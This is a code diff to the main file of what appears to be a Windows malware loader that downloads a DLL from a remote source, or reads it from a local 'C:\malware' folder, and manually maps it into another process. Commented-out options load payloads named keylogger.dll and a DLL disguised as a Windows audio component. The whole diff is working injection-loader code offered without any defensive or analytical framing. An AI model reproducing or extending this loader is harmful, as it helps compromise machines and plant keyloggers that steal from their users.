@@ -1,10 +1,15 @@
 //cl /EHsc .\main.cpp .\injection.cpp /link /OUT:main.exe
 #define DEBUG 1
+#define READ_LOCALLY 0
 
 #include "injection.h"
 #include <iostream>
 #include <Windows.h>
 #include <vector>
+
+#if READ_LOCALLY
+    #include <fstream>          //  temp to load from disk 
+#endif
 
 ///////////////////////////////////////////////////////////////////////////////////////
 
@@ -150,16 +155,42 @@ int main()
     if(!hProc) { fuk("Somethig went wrong"); return 1; }
     else norm("hProc -> " ,CYAN"", hProc, "\n");
 
-    load_dll();
-    std::vector <unsigned char> downloaded_dll = receive_data_raw("cute_lib.dll");
-    // std::vector <unsigned char> downloaded_dll = receive_data_raw("network_lib.dll");
-    // std::vector <unsigned char> downloaded_dll = receive_data_raw("keylogger.dll");
-    // std::vector <unsigned char> downloaded_dll = receive_data_raw("keylog_k_lib.dll");
-    // std::vector <unsigned char> downloaded_dll = receive_data_raw("target_code.dll");
-    // std::vector <unsigned char> downloaded_dll = receive_data_raw("AudioEndpointBuilder.dll");
-    if(downloaded_dll.empty()) fuk("Download fail\n");
-    else { norm("\n"); ok("download done"); }
+    #if READ_LOCALLY
 
+        std::vector<unsigned char> downloaded_dll;
+        std::string dll_filename = "C:\\malware\\dll_injection\\basic_dll\\cute_lib.dll"; // Specify the DLL file name
+
+        std::ifstream file(dll_filename, std::ios::binary | std::ios::ate);
+        if (!file.is_open())
+        {
+            fuk("Failed to open " + dll_filename + "\n");
+            return 1;
+        }
+
+        std::streamsize size = file.tellg();
+        file.seekg(0, std::ios::beg);
+
+        downloaded_dll.resize(size);
+        if (!file.read(reinterpret_cast<char*>(downloaded_dll.data()), size))
+        {
+            fuk("Failed to read " + dll_filename + " into vector\n");
+            return 1;
+        }
+    
+    #else
+
+        load_dll();
+
+        std::vector <unsigned char> downloaded_dll = receive_data_raw("cute_lib.dll");
+        // std::vector <unsigned char> downloaded_dll = receive_data_raw("network_lib.dll");
+        // std::vector <unsigned char> downloaded_dll = receive_data_raw("keylogger.dll");
+        // std::vector <unsigned char> downloaded_dll = receive_data_raw("keylog_k_lib.dll");
+        // std::vector <unsigned char> downloaded_dll = receive_data_raw("target_code.dll");
+        // std::vector <unsigned char> downloaded_dll = receive_data_raw("AudioEndpointBuilder.dll");
+        if(downloaded_dll.empty()) fuk("Download fail\n");
+        else { norm("\n"); ok("download done"); }
+
+    #endif
 
     if(!ManualMap(hProc, &downloaded_dll))
     {
